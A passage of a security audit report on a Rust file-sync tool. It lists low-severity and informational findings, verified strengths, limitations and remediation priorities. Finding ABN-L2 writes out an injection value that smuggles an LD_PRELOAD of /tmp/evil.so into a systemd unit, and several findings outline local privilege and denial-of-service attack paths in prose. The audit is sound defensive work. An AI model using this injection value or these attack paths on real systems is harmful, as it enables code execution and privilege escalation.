| ABN-L1 | State tree world-readable [confirmed] | `src/service.rs:38`, `src/supervisor/mod.rs:2280`, `src/main.rs:2663`, `src/persist.rs:226` | `~/.autobahn` is only ever `create_dir_all`'d (0755); `service.log`, `status/*.json`, scan caches are 0644-class. On macOS (home dirs 0755) any local user reads synced paths, hosts, conflict names, topology. `init`/`disable`/`enable` rewrite `config.toml` at umask defaults, silently relaxing a user-hardened 0600 → 0644; `Config::load` does no ownership/writability check despite the file carrying executable hooks. Fix: 0700 state root (enforce on startup), 0600 files, preserve config mode on rewrite, ssh-style warn/refuse on group/world-writable config. |
| ABN-L2 | systemd unit injection via unescaped paths [confirmed] | `src/service.rs:427-446` | `ExecStart`, `Environment="AUTOBAHN_HOME=..."`, `StandardOutput` are string-interpolated with no quoting/escaping. A newline in a path injects whole unit directives; `AUTOBAHN_HOME=/x" "LD_PRELOAD=/tmp/evil.so` splits into two assignments. Runs as the installing user (user unit), so exposure is a tricked install or broken unit for homes with spaces. The plist side escapes correctly. |
| ABN-L3 | In-place chmod on hardlinked inodes [likely] | `src/endpoint/local.rs:2607` | macOS has no `fs.protected_hardlinks`: a local user hardlinks a root-owned file into the tree; a root-running agent's exec-bit flip chmods the shared inode (e.g. 0700 on `/etc/sudoers`). Fix: publish mode changes by rename like content changes, or refuse in-place metadata changes on multiply-linked files. |
| ABN-L4 | `base_signature` lstat→open race: rsync-signature oracle [likely] | `src/endpoint/local.rs:3001-3008` | Same-UID swap between lstat and open yields per-block weak+BLAKE3 signatures of an arbitrary readable file, returned to the peer — a content-guessing oracle for low-entropy blocks. Fix: `O_NOFOLLOW` + `fstat` regular-file check on the same fd. |
| ABN-L5 | `Response::Scan` snapshots skip hierarchy validation [confirmed] | `src/endpoint/remote.rs:136-153` | Only the delta path calls `root.validate` (`:243`); the direct `Scan` arm and `ScanUnchanged` replay do not. A hostile peer's unsorted/duplicate children violate the ordering every merge assumes → mis-pairing, spurious delete+recreate transitions, poisoned baseline. On-disk escape is still blocked by apply-side `validate_path`. Fix: validate in the `Scan` arm before installing `last_snapshot`. |
| ABN-L6 | Watch-setup symlink TOCTOU [suspected] | `src/endpoint/local.rs:266,242,401-408` | Directory swapped for a symlink between `symlink_metadata` and `inotify_add_watch` watches an outside path; events fail `strip_prefix` and degrade to full rescans — a repeated full-scan DoS, not a read primitive. |
| ABN-L7 | Oversized `AncestorRecord` wedges a follower permanently [likely] | `src/session/ancestor.rs:731` (1 GiB cap enforced on **read**, never on append), `:721` (whole-journal slurp on open) | A peering leader's >1 GiB record lands on disk and fails every subsequent open → session never recovers until manual `reset`. Fix: enforce the cap on the write path (checkpoint instead), treat oversized tail like a torn record. |
| ABN-L8 | Peer pins the client at 100% duty cycle [likely] | `src/supervisor/mod.rs:1100-1140` | Instant `changed` answers defeat the interval cadence; nothing errors, so backoff never applies: continuous back-to-back full cycles at the peer's discretion. Fix: minimum cycle period (sleep the remainder of `interval − cycle_duration`). |
| ABN-L9 | Scan/tree recursion depth vs 2 MiB helper stacks [suspected] | `src/scan/mod.rs:531,897,316` | PATH_MAX-deep trees (~2000 levels) approach the scoped-thread stack; a FUSE mount can synthesize the depth within PATH_MAX. Peer-supplied trees have no bound at all (see ABN-H7). Fix: depth cap marking deeper content problematic; explicit-stack walk or larger stacks. |
| ABN-L10 | Unbounded readdir materialization [confirmed] | `src/scan/mod.rs:1059-1067`, limit checked only post-build at `src/endpoint/observer.rs:401-405` | `max_entry_count` bounds willingness to proceed, not memory consumed; an adversarial directory (FUSE) yields entries forever → OOM kills the whole supervisor. Fix: enforce the budget incrementally during the walk. |
| ABN-L11 | No mount-point boundary (`st_dev`) in the scanner [confirmed] | `src/scan/mod.rs:851` | Anything mounted under the root is traversed; unprivileged FUSE mounts fully control `lstat`/`readdir`/read behavior and timing — the enabling condition for ABN-M17/L9/L10. Fix: record root `st_dev`, refuse to descend across devices by default (opt-in for multi-mount roots). |
| ABN-L12 | No root/sudo guard [likely] | `src/main.rs` (no euid check anywhere), `src/paths.rs:17-23` | Under sudo on macOS, `$HOME` is the caller's: `sudo autobahn watch` runs as root against the user's `~/.autobahn`, creating root-owned state (breaks all later unprivileged runs) and root-owned synced files; `sudo autobahn install` registers a root service reading a user-writable config with `on_alert`/`agent_command` — a user→root execution path. Fix: refuse mutating subcommands at euid 0 without an explicit override flag. |
| ABN-L13 | `run_sync` never expands `~` in endpoint arguments [confirmed] | `src/main.rs:841-846` | A quoted `~/backup` becomes a CWD-relative literal `./~` tree (beta side silently succeeds); the session identity/lock is computed on the bogus path. Fix: `expand_tilde` on local specs exactly as `parse_endpoint` does. |
| ABN-L14 | Release workflow token/keychain hygiene [likely/confirmed] | `.github/workflows/release.yml:20` (top-level `contents: write` for all jobs, incl. the secret-holding mac job), `:147-153` (tray `cargo build` runs crate build scripts/proc-macros while the Developer ID keychain is unlocked and partition-listed) | A token or dependency compromise in a build job can rewrite published release assets (defeating ABN-M18's checksums) or drive `codesign` with Voltai's identity. Fix: `contents: read` top-level, `write` only on the `release` job; compile before importing secrets. |
| ABN-L15 | `orchestrate.py` interpolates remote output into `shell=True` commands [likely] | `bench/orchestrate.py:743,490` (also `bench/verify/launch.py:62,121`) | `json.dumps` does not escape single quotes; a tampered bake/source instance returns a key line containing `'` and executes on the operator's workstation (holding AWS credentials) before ssh runs. Fix: `shlex.quote` or argv-list subprocess. |
| ABN-L16 | bincode 1.3.3 (maintenance-mode 1.x) deserializes every wire frame [suspected] | `Cargo.toml:9`, `Cargo.lock:344` | No known RCE at 1.3.3 (RUSTSEC-2022-0061 is fixed exactly there), but the line receives no further fixes and sits on the hostile-input path. Fix: plan migration to bincode 2; until then the framing-layer caps are the compensating control. |

---

## 7. Informational

| ID | Finding | Location | Summary |
|---|---|---|---|
| ABN-I1 | No `cargo-audit`/`cargo-deny`/dependabot in CI [confirmed] | `.github/workflows/` | 200+ pinned crates, no advisory surfacing; new RUSTSEC advisories ship silently. Add dependabot (cargo + github-actions) and a `cargo audit` job. |
| ABN-I2 | Default ignores exclude no secret-bearing directories [confirmed] | `src/config.rs:89` | Defaults are `.git`, `.DS_Store`, `node_modules`, `target`. A root covering a home directory syncs `.ssh`/`.aws`/`.gnupg` to every destination — amplifying ABN-C1/H3/H4. Document prominently; consider cautious defaults or a first-run warning. |
| ABN-I3 | Install is curl\|sh with same-origin checksums; Linux binaries unsigned [confirmed] | `README.md:8`, `scripts/install.sh` | Trust root is GitHub-account + TLS integrity alone (see ABN-M18). macOS artifacts are signed + notarized; add attestations/signatures for Linux. |
| ABN-I4 | `StrictHostKeyChecking` not set explicitly [confirmed] | `src/transport/mod.rs:73-83` | Defaults to the user's ssh config; `BatchMode=yes` makes unknown-host prompts fail closed, so this is safe by default — but a permissive user config (`accept-new`/`no`) silently weakens MITM resistance for a sync tool that writes files. Consider `StrictHostKeyChecking=accept-new` explicitly and documenting the choice. |

---

## 8. Positive observations (verified during the audit)

These held up under deliberate attack-oriented review and are worth preserving:

- **Framing layer** (`transport/mod.rs:1167-1258`): length prefix and lz4 decompressed size are validated against the 64 MiB frame cap **before** any allocation; unknown flags, empty/truncated frames and messages error cleanly; an adversarial fuzz-test module exists.
- **SSH invocation**: argv-array (no local shell), `--` terminator before the destination, leading-dash refusal in config parsing, `BatchMode=yes`, compile-time-constant remote command, no agent/X11 forwarding enabled.
- **Control socket**: `SO_PEERCRED`/`getpeereid` same-user check on **every** connection before any request is read, read/write timeouts, 0600 socket, deliberately shallow command set.
- **Apply discipline** (`endpoint/local.rs`): every `Change.path` validated (`validate_path`/`validate_name`), no mknod/FIFO/device creation, modes masked to `0o777` (no setuid propagation), `lchown` with locally configured owner only, peer mtimes never applied, staged content digest-reverified before both move and copy publishes, `RENAME_EXCL`/`RENAME_NOREPLACE` with correct errno fallback, case/Unicode folding collision handling.
- **rsync `patch()`**: block-range math uses `checked_add`/`checked_mul`; all content/snapshot digests are full 32-byte BLAKE3, never truncated.
- **Update flow**: checksum verified **before** anything moves, rename-into-place (never overwrite a running binary), keeps `autobahn.previous`, rolls back on failed restart, refuses when `SHA256SUMS` is absent, whole-name checksum matching.
- **`unsafe` audit** (all ~15 blocks): only libc POD types with `mem::zeroed`, async-signal-safe signal handlers (single `AtomicBool` store), straightforward syscall wrappers. No soundness concerns found.
- **No secrets committed**; macOS app has hardened runtime with no entitlement exceptions, no URL schemes, no ATS exceptions, and the notary flow parses and fails loudly on Apple's verdict.
- **CI positives**: no `pull_request_target`, no `github.event.*` interpolated into `run:` blocks, P12 handled in a throwaway random-password keychain with an `if:always()` cleanup, tag↔version gate before builds.
- **Reload** re-runs full validation on every edit; `deny_unknown_fields` throughout config; no env-var expansion or include mechanism in config.

## 9. Limitations

- Static audit only; no dynamic exploitation was performed. Findings tagged [likely]/[suspected] have at least one unverified link.
- `cargo audit` was not runnable in the audit environment (no binary/network); dependency-advisory statements are knowledge-based.
- The peering findings (H1–H5, M1, L7) affect the documented **experimental** peering modes; deployments not using `peering-*-experimental` modes or `peering attach` are not exposed to them. ABN-C1, H6–H10, and the Medium/Low non-peering items apply to **default** deployments.
- Test-only weaknesses were excluded by policy; `tests/` and `bench/harness` were not audited for correctness.
- The bench/orchestration findings assume the documented use against test infrastructure.

## 10. Remediation priority

1. **ABN-C1** — validate `StagingNeed` paths at the supply boundary (membership + confinement). Single point fix closes the worst default-config exposure.
2. **ABN-H6, H8, H9** — stop trusting peer-declared lengths (`with_capacity`, `block_size`, `hashes.len()`, per-file delta buffering). Small, localized guards.
3. **ABN-H1** — whitelist-validate `Initialize.session`/`side` on the agent before any filesystem use.
4. **ABN-H2** — strip/reject `agent_command` (and owner fields) in pushed peering configs.
5. **ABN-H7** — depth-budget `Node` decoding (or accept I9-B explicitly in user-facing docs with the crash consequence stated).
6. **ABN-H11** — refuse sync roots containing the state root/config.
7. **ABN-M18** — signed releases (minisign/attestations) verified by updater and installer; fail-closed installer.
8. **ABN-M13/M14/M15** — one sanitization helper at every presentation/log boundary; quote fix-command interpolations.
9. **ABN-M12/H12/M16/L1** — systematic temp/state-dir permissions (0700 dirs, `O_EXCL`/`O_NOFOLLOW` creates, `$XDG_RUNTIME_DIR` where available).
10. **ABN-M19/I1** — CI: `permissions:` blocks, SHA-pinned actions, pinned+checksummed jar, `cargo audit` job.
